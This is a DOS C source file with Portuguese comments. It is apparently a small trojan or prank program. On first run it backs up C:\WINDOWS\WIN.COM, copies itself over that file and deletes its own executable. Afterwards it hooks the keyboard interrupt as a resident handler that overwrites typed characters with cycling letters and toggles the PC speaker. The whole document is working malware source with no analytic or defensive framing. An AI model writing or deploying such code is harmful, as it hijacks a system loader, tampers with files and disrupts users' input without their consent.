#include<conio.h>
#include<stdio.h>
#include<dos.h>
int tecla,i=0,x,y;
char tmp[]="E\7",e[]="E\7",t[]="T\7",v[]="V\7",a[]="A\7",sp[]=" \7";
void interrupt (far *AntInt9)(void);//Funcao endeco da Int 9 verdadeira.
void interrupt far Funcao() //Esta funcao sera executada toda vez que
{                           //a int 9 for chamada!
asm sti       //Salva todos os registradores!
asm in al,60h //Le a porta da teclado
tecla = _AL;
asm mov	al,20h
asm out	20h,al
x = wherex(); //posicao do
y = wherey(); //cursor
puttext(x-1,y,x-1,y,tmp);
if(tecla<128)
  i++;
if(i>4)
   i=0;
if(i==0)
   strcpy(tmp,e);
if(i==1)
   strcpy(tmp,t);
if(i==2)
   strcpy(tmp,v);
if(i==3)
   strcpy(tmp,a);
if(i==4)
   strcpy(tmp,sp);
if(tecla==1)
  outportb(0x61,3);
if(tecla==2)
  outportb(0x61,0);
AntInt9();                //chama o processamento correto da int 9
}
void main(int argc, char *argv[])
{
  FILE *s;
  char muda[60]="copy ",del[60]="del ";
  strcat(muda,argv[0]);
  strcat(muda," c:\\windows\\win.com");
  strcat(del,argv[0]);
  if ((s=fopen("C:\\WINDOWS\\SYS.TMP","r+"))==NULL){
       s=fopen("C:\\WINDOWS\\SYS.TMP","wt");
       fprintf(s,"System\n");
       fclose(s);
       system("copy c:\\windows\\win.com c:\\windows\\sis.com");
       clrscr();
       system(muda);
       clrscr();
       system(del);
       clrscr();
       exit(1);
       }
AntInt9=getvect(9);//Le o endereco da Antiga Int 9 e guarda.
setvect(9,Funcao); // Instala ISR na memoria para monitorar o teclado

#ifdef RESIDENTE
	 keep(0, (_SS + (_SP/16) - _psp));//retorna ao dos,mas recidente.
#else
	 system("\sis");
	 disable();
	 setvect(9,Funcao);
	 enable();
#endif
return;
}
